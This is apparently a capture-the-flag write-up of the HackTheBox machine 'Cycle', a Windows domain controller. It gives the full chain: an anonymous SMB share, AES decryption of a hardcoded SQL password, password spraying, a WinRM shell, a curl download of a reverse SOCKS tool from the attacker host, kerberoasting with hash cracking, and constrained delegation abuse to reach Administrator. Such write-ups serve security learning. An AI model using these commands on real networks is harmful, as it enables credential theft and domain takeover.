# Cycle
The nmap shows a windows box.
```
# nmap -sCV -p- cycle.htb
Nmap scan report for cycle.htb (10.129.58.189)
Host is up (0.17s latency).
Not shown: 65524 filtered ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49536/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-24 15:02:54
|_  start_date: N/A
```

Looking at port 445 (SMB) we could see that the machine is a domain controller.

```
$ smbclient -U " "%" " -L //cycle.htb/
Unable to initialize messaging context

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      Shared folder
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```
The `Backups` share can be accessed anonymously:

```
$ smbclient -U " "%" " //cycle.htb/Backups
Unable to initialize messaging context
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 11 13:01:45 2021
  ..                                  D        0  Fri Jun 11 13:01:45 2021
  Onboarding.docx                     A     6495  Fri Jun 11 13:01:33 2021
  sqltest_deprecated.exe              A     6144  Fri Jun 11 13:01:45 2021
  test.txt                            A        5  Fri Jun 11 12:54:50 2021

                5237247 blocks of size 4096. 2108119 blocks available
smb: \> 
```

`Onboarding.docx` suggests a password reuse with the following information.
```
MegaCorp Onboarding Document

Hello newbie!

We’re excited to have you here and look forward to working with you. Here are a few things to help you get started:

Workstation password: Meg@CorP20!

Username format: FLast (Eg. JDoe)

Please change the password once you login!

Note: This document has been deprecated in favor of the new cloud board.
```
The binary `sqltest_deprecated.exe` is a .NET assembly.
By quickly looking at it on IDA we can see the following code:
```
aDczkw0ktscdnll:                        // DATA XREF: SQLTest__Main↑o
    text "UTF-16LE", "dcZKW0ktsCDNlLjH3wEdmnURrL1okbk6FJYE5/hpfe8=",0
aNxl6e8rtljuaip:                        // DATA XREF: SQLTest__Main+B↑o
    text "UTF-16LE", "nXL6E8RtlJuaipLQtVQo9A==",0
aDckxwal4e3zeji:                        // DATA XREF: SQLTest__Main+16↑o
    text "UTF-16LE", "dckxwaL4e3ZeJi8T0078rM3rwB39S+zmnrPf1ON1x2A=",0
 string SQLTest::Decrypt(unsigned int8[] cipherText, unsigned int8[] Key, unsigned int8[] IV)

Data Source=localhost;Initial Catalog=Production;Us"
    text "UTF-16LE", "er id=sqlsvc;Password={0}
```
The exe does a simple AES decryption in order to connect to the sql database. We can retrieve the password with [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'Base64','string':'dcZKW0ktsCDNlLjH3wEdmnURrL1okbk6FJYE5/hpfe8%3D'%7D,%7B'option':'Base64','string':'nXL6E8RtlJuaipLQtVQo9A%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=ZGNreHdhTDRlM1plSmk4VDAwNzhyTTNyd0IzOVMrem1uclBmMU9OMXgyQT0):
![AES password decryption](img/aes_decrypt.png "AES password decryption")

We obtain the following credentials: `sqlsvc:T7Fjr526aD67tGJQ`.

Credentials are valid on the domain (confirmed by CrackMapExec).
```
$ cme smb cycle.htb -u sqlsvc -p T7Fjr526aD67tGJQ
SMB         10.129.1.6      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.1.6      445    DC01             [+] MEGACORP.LOCAL\sqlsvc:T7Fjr526aD67tGJQ
```

With this valid account we can retrieve domain users through RPC.
```
$ rpcclient -W MEGACORP.LOCAL cycle.htb -U 'sqlsvc%T7Fjr526aD67tGJQ' -c enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[dsc] rid:[0x3e8]
user:[GReynolds] rid:[0x450]
user:[TMoore] rid:[0x451]
[...]
```

We remember the on-boarding document. We tried to spray the previous password against all users and found 2 valid users (don't forget the `--continue-on-success` or you will miss WLee account).
```
$ cme smb cycle.htb -u users.txt -p 'Meg@CorP20!' --continue-on-success
SMB         10.129.1.6      445    DC01             [-] MEGACORP.LOCAL\Administrator:Meg@CorP20! STATUS_LOGON_FAILURE
SMB         10.129.1.6      445    DC01             [-] MEGACORP.LOCAL\Guest:Meg@CorP20! STATUS_LOGON_FAILURE
[...]
SMB         10.129.1.6      445    DC01             [+] MEGACORP.LOCAL\KPrice:Meg@CorP20!
SMB         10.129.1.6      445    DC01             [+] MEGACORP.LOCAL\WLee:Meg@CorP20!
```

With this account we can get command execution with evil-winrm:

```
$ evil-winrm -u WLee -p 'Meg@CorP20!' -i cycle.htb
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\wlee\Documents>
*Evil-WinRM* PS C:\Users\wlee\desktop> cat user.txt
HTB{cycl3_g0_brrrr}
```

Common ports on domain controller are not exposed. We setup a socks server in order to enumerate the domain with impacket.
```
$ ./revsocks -listen 10.10.14.27:11000 -socks 127.0.0.1:1100 -pass a_strong_password_ofc
```
```
*Evil-WinRM* PS C:\windows\temp> curl 10.10.14.27/revsocks.exe -o revsocks.exe
*Evil-WinRM* PS C:\windows\temp\mine> .\revsocks.exe -connect 10.10.14.27:11000 -pass a_strong_password_ofc
```

We also run bloodhound and discover few interesting things. First one: we can kerberoast GFisher user.
```
$ proxychains GetUserSPNs.py MEGACORP.LOCAL/sqlsvc:T7Fjr526aD67tGJQ -request
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  -------  --------  --------------------------  --------------------------  -----------
HTTP/Web01            GFisher            2021-06-11 12:59:40.165903  2021-06-11 13:42:38.853453  constrained 



$krb5tgs$23$*GFisher$MEGACORP.LOCAL$MEGACORP.LOCAL/GFisher*$b6851d6368749c79d643f6381aef0331$981a7fc2be63c1a8dc8321be5ab590cbcda5449f477c40ba753a3ad72df55e14a72ac7ef38ae187a19315102fd82cc337937a821e705462e7ecfdfa08ce67e923ac7ad6ba6440ae4a1eb5bc5498b82c6e288c0287fe7739ab3b287f52c73c14242213e2fc189c5daca1e6911273769373f56ab0c287dc2a208efa13a872f3aef90f84bb8dfd4f6fd4bcd28a1b0bd4655a8ffb6b4bee8d9b539555611dabc8bb3f841236416cc283d18ac8098099e1015656a9f4078dba08bd70230aafeaf2fe304309e9a031ba94fc5bb82966062ef29dad8bfdc7fa9bae3f9a7f00d476c36ae70f9ac15b9bb11bcfe854d2e5127b298787b4b1d31ad77d3e8fd879189bee5810b3d38d2afa104a7eb145e7dd60618aa6469c28b8701808c032337054cac1aa527a42a074ee8cd986185d56ae37209e6e33b581013a64e7765a0d35d6a3d94a9fd749100afda22397652482c8ce62812eaf8083757dc36b1f4e4d9edfe370e3b3f0c2ba8a7eb47815bc29d1afff9686ccd437680fd4ed91160f9fac61f14622a6590de7ff0eacae5d33a3bcefee77b6d54e989f2f37a99e0be0ca41ca82c14f0aa23001c2174474bdb7e16a7665b918559fd0f5d46bf39ecd284b467dd32a411c565ac80923d4497c4722ce6157fff42fbe14cf6a17286a1769607fd63f74d5d5b01594dd188735076156f9c5934b2ea2eb5795e85170d7caa760af50fea663180530c384e1733d2557121eee980957f696594385ebcb54cf88baebb341b5cc6233df884a4c225e3bf68f3f00a31c1426075342cbeb8b22331b32f226bb911e6ad01f713c3d8824c0ca69a19b0d7e55ecfd187633629ead55a28ba1f576a5f76a447cfb333adafebeafb7837055c90f37418be0b6a21ae0c3b25b2866d60c986b3562541eb5fe4d0bb122294cea43f77c9c57c977e1cff2dcb6a2f854021a72747f50af89c170c5814be0222e8d7c72923550333bce86bb980f5eb78f3c54a48ccdcceca9a1f192c364d75946ff9a3717a9325f898670b4791419f60901f6bc19930a4ff0b037fb99840081988f5cf8bafacdef07479226a0c88b44763f560a00c45a318d4f76b9ebdca823082787fa210f1efebc49721aa062b11ea2472a89339e1a918868de9a302ca435cb94c264c812afd6c0f27b9156b30276c53aa6261dedac6b2b865ec6cbccb996811aa79d856c0e064caebb1ad5d2d4f3129eadccf4cbe9f9c865ab7a905f06a21fe6c85e2accbcccb849ddf6ec811afdcd6622e021d5ad8e75b1dedd1d556e34b9af547c71628030e5ffa51ee010ed2fc36605a919e9178c666d1c8bc04143adb1f7307677956ac4e22

$ john fisher.hash --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
escorpion10      (?)
```

With GFisher we can abuse the constrained delegation to takeover the domain.
![Constrained delegation abuse](img/constrained_delegation.png "Constrained delegation abuse")

We used impacket to request a TGT for the domain Administrator account and get the root flag.
```
$ proxychains getST.py -spn MSSQL/DC01.MEGACORP.LOCAL -impersonate Administrator MEGACORP.LOCAL/GFISHER:'escorpion10'
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

$ export KRB5CCNAME=Administrator.ccache

$ proxychains wmiexec.py -k -no-pass DC01.MEGACORP.LOCAL
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>type C:\users\administrator\desktop\root.txt
HTB{d0nt_c0nstrain_m3_br0}
```